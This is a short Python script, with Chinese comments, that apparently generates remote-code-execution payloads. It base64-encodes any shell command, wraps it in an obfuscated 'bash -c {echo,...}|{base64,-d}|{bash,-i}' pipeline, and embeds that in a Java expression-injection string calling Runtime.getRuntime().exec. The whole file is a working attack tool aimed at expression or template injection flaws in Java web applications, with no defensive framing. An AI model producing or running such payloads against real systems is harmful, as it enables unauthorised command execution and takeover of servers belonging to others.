# bash命令base64编码转换
import base64

def bash_to_base64(command):
    command = base64.b64encode(command.encode("utf-8"))  # base64编码
    command = command.decode()  # 将bytes转换为string
    command = "bash -c {echo," + command + "}|{base64,-d}|{bash,-i}"  # 转换命令的格式
    command = "[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('" + command + "')]"
    return command
command = input("命令: ")
print(bash_to_base64(command))
